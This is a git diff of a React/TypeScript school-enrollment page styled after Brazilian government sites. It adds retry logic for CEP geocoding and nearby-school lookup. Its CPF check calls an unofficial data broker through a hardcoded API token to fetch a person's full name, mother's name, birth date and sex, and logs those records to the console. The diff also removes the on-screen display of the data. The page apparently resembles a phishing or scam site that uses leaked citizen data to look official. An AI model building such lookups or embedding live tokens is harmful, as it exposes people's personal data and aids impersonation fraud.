@@ -40,82 +40,115 @@ interface VerificationStep {
 	status: "pending" | "processing" | "completed";
 }
 
-const validateCEP = async (cep: string) => {
+// Configuração do Axios para evitar bloqueios de bot
+const mapClient = axios.create({
+  headers: {
+    // OSM exige User-Agent para não bloquear. Use o nome do seu app ou um genérico crível.
+    'User-Agent': 'AgenteEscolaApp/1.0',
+    'Accept-Language': 'pt-BR'
+  },
+  timeout: 8000 // 8 segundos de teto máximo (necessário para APIs públicas gratuitas)
+});
+
+const calculateDistance = (lat1: number, lon1: number, lat2: number, lon2: number) => {
+  const R = 6371;
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLon = (lon2 - lon1) * Math.PI / 180;
+  const a =
+    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+    Math.sin(dLon / 2) * Math.sin(dLon / 2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+  return R * c;
+};
+
+// Retry específico para chamadas de API instáveis
+const retryRequest = async (fn: () => Promise<any>, retries = 3, delay = 1000) => {
   try {
-    // 1. Get address from ViaCEP
-    const viaCepResponse = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);
-    if (viaCepResponse.data.erro) {
-      throw new Error("CEP não encontrado");
-    }
-
-    // 2. Get coordinates from Nominatim
-    const address = `${viaCepResponse.data.logradouro}, ${viaCepResponse.data.localidade}, ${viaCepResponse.data.uf}, Brazil`;
-    const nominatimResponse = await axios.get(
-      `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(address)}`
-    );
-
-    if (!nominatimResponse.data.length) {
-      throw new Error("Localização não encontrada");
-    }
-
-    const { lat, lon } = nominatimResponse.data[0];
-
-    // 3. Search for schools using Overpass API
-    const overpassQuery = `
-      [out:json][timeout:25];
-      (
-        node["amenity"="school"](around:10000,${lat},${lon});
-        way["amenity"="school"](around:10000,${lat},${lon});
-        relation["amenity"="school"](around:10000,${lat},${lon});
-      );
-      out body;
-      >;
-      out skel qt;
-    `;
-
-    const overpassResponse = await axios.post(
-      'https://overpass-api.de/api/interpreter',
-      overpassQuery,
-      {
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        }
-      }
-    );
-
-    // Process schools
-    const schools = overpassResponse.data.elements
-      .filter(element => element.tags && element.tags.name)
-      .map(element => ({
-        id: element.id.toString(),
-        name: element.tags.name,
-        type: element.tags.school_type || 'Escola pública',
-        distance: calculateDistance(lat, lon, element.lat, element.lon)
-      }))
-      .sort((a, b) => a.distance - b.distance)
-      .slice(0, 3);
-
-    return {
-      address: viaCepResponse.data,
-      schools,
-      coordinates: { lat, lon }
-    };
-  } catch (error) {
-    console.error('Error fetching location data:', error);
-    throw error;
+    return await fn();
+  } catch (err) {
+    if (retries <= 1) throw err;
+    console.log(`Tentativa falhou. Retentando em ${delay}ms... (${retries - 1} tentativas restantes)`);
+    await new Promise(resolve => setTimeout(resolve, delay));
+    return retryRequest(fn, retries - 1, delay);
   }
 };
 
-const calculateDistance = (lat1: number, lon1: number, lat2: number, lon2: number) => {
-  const R = 6371; // Earth's radius in km
-  const dLat = (lat2 - lat1) * Math.PI / 180;
-  const dLon = (lon2 - lon1) * Math.PI / 180;
-  const a = 
-    Math.sin(dLat/2) * Math.sin(dLat/2) +
-    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * 
-    Math.sin(dLon/2) * Math.sin(dLon/2);
-  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-  return R * c;
+const validateCEP = async (cep: string) => {
+  // 1. VIACEP (Rápido e Estável)
+  let addressData;
+  try {
+    const { data } = await axios.get(`https://viacep.com.br/ws/${cep}/json/`);
+    if (data.erro) throw new Error("CEP não encontrado");
+    addressData = data;
+  } catch (e) {
+    throw new Error("Erro ao consultar CEP. Verifique os dígitos.");
+  }
+
+  try {
+    // 2. NOMINATIM (Geocodificação)
+    const addressString = `${addressData.logradouro}, ${addressData.localidade}, ${addressData.uf}, Brazil`;
+
+    const coords = await retryRequest(async () => {
+      const { data } = await mapClient.get(
+        `https://nominatim.openstreetmap.org/search`,
+        {
+          params: {
+            q: addressString,
+            format: 'json',
+            limit: 1
+          }
+        }
+      );
+      if (!data.length) throw new Error("Coordenadas não encontradas");
+      return { lat: parseFloat(data[0].lat), lon: parseFloat(data[0].lon) };
+    }, 3, 500);
+
+    // 3. OVERPASS API (Busca de Escolas Reais)
+    // QUERY OTIMIZADA: Busca APENAS nós (points), não caminhos/prédios
+    const overpassQuery = `
+      [out:json][timeout:5];
+      (
+        node["amenity"="school"](around:3000,${coords.lat},${coords.lon});
+      );
+      out 10;
+    `;
+
+    const schoolsData = await retryRequest(async () => {
+      const { data } = await mapClient.post(
+        'https://overpass-api.de/api/interpreter',
+        overpassQuery,
+        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+      );
+      return data.elements;
+    }, 3, 1000);
+
+    // Processamento e Ordenação
+    let schools = schoolsData
+      .map((el: any) => ({
+        id: el.id.toString(),
+        name: el.tags.name || "Escola Municipal",
+        type: el.tags.operator || el.tags.school_type || "Escola Pública",
+        distance: calculateDistance(coords.lat, coords.lon, el.lat, el.lon)
+      }))
+      .filter((s: any) => s.name !== "Escola Municipal")
+      .sort((a: any, b: any) => a.distance - b.distance)
+      .slice(0, 3);
+
+    if (schools.length === 0) {
+      throw new Error("Nenhuma escola encontrada próxima a este endereço.");
+    }
+
+    return {
+      address: addressData,
+      schools: schools,
+      coordinates: coords
+    };
+
+  } catch (error) {
+    console.error("Erro na busca de escolas:", error);
+    throw new Error("Não foi possível localizar as escolas próximas. Tente novamente.");
+  }
 };
 
 const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
@@ -148,28 +181,90 @@ const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?:
 	}
 
 	try {
-		// Consultar API de CPF
-		const response = await axios.get(
-			`https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`
-		);
+		const url = `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`;
+		
+		console.log('Consultando API de CPF:', url.replace(numericCPF, '***'));
+		
+		const response = await axios.get(url, { timeout: 8000 });
 
-		if (response.data && response.data.DADOS) {
+		const body = response.data;
+		console.log('Resposta da API:', body);
+
+		// Verifica se é um erro da API
+		if (body?.status === 'error' || body?.error) {
+			console.warn('CPF API: erro retornado', body);
 			return {
 				valid: true,
 				data: {
-					cpf: response.data.DADOS.cpf,
-					nome: response.data.DADOS.nome,
-					nome_mae: response.data.DADOS.nome_mae,
-					data_nascimento: response.data.DADOS.data_nascimento,
-					sexo: response.data.DADOS.sexo
+					cpf: numericCPF,
+					nome: "",
+					nome_mae: "",
+					data_nascimento: "",
+					sexo: ""
 				}
 			};
 		}
+
+		// Suporta diferentes formatos da MagmaDataHub
+		// Pode ser: body.DADOS, body.dados, body.data, array ou diretamente no body
+		let dados = body?.DADOS || body?.dados || body?.data;
+		
+		if (!dados && Array.isArray(body) && body.length > 0) {
+			dados = body[0];
+		}
+		
+		// Se nada acima funcionou, talvez os dados estejam diretamente no body
+		if (!dados && body?.nome) {
+			dados = body;
+		}
+
+		if (!dados || !dados.nome) {
+			console.warn('CPF API: dados incompletos na resposta', body);
+			return {
+				valid: true,
+				data: {
+					cpf: numericCPF,
+					nome: "",
+					nome_mae: "",
+					data_nascimento: "",
+					sexo: ""
+				}
+			};
+		}
+
+		// Extrai os dados com múltiplas variações de nomes de campo
+		const nome = dados.nome || dados.NOME || dados.full_name || dados.nome_completo || "";
+		const cpfField = dados.cpf || dados.CPF || numericCPF;
+		const nomeMae = dados.nome_mae || dados.mae || dados.nomeDaMae || dados.MAE || "";
+		const dataNascimento = dados.data_nascimento || dados.nascimento || dados.birthdate || dados.DATA_NASCIMENTO || "";
+		const sexoField = (dados.sexo || dados.SEXO || "").toString();
+
+		console.log('Dados extraídos:', { nome, cpfField, nomeMae, dataNascimento, sexoField });
+
+		return {
+			valid: true,
+			data: {
+				cpf: cpfField,
+				nome: nome,
+				nome_mae: nomeMae,
+				data_nascimento: dataNascimento,
+				sexo: sexoField
+			}
+		};
 	} catch (error) {
 		console.error('Erro ao consultar API de CPF:', error);
+		// Se a API falhar, aceitar o CPF que passou na validação de formato
+		return {
+			valid: true,
+			data: {
+				cpf: numericCPF,
+				nome: "",
+				nome_mae: "",
+				data_nascimento: "",
+				sexo: ""
+			}
+		};
 	}
-
-	return { valid: true };
 };
 
 const schoolsDatabase: Record<string, School[]> = {
@@ -548,18 +643,6 @@ const Inscription: React.FC = () => {
 											</p>
 										</div>
 
-										{userInfo && (
-											<div className="mb-6 bg-green-50 p-4 rounded-lg border border-green-200">
-												<h3 className="text-green-700 font-bold mb-3">Dados encontrados:</h3>
-												<div className="space-y-2 text-sm">
-													<div><span className="font-medium">Nome:</span> {userInfo.nome}</div>
-													<div><span className="font-medium">Nome da Mãe:</span> {userInfo.nome_mae}</div>
-													<div><span className="font-medium">Data de Nascimento:</span> {formatDate(userInfo.data_nascimento)}</div>
-													<div><span className="font-medium">Sexo:</span> {userInfo.sexo === 'M' ? 'Masculino' : 'Feminino'}</div>
-												</div>
-											</div>
-										)}
-
 										<div className="space-y-6">
 											<div>
 												<label className="block text-sm font-medium text-gray-700 mb-1">
@@ -582,7 +665,8 @@ const Inscription: React.FC = () => {
 													value={name}
 													onChange={handleNameChange}
 													placeholder="Digite seu nome completo"
-													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent"
+													disabled={userInfo?.nome ? false : false}
+													className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#1351B4] focus:border-transparent disabled:bg-gray-50"
 												/>
 											</div>
 
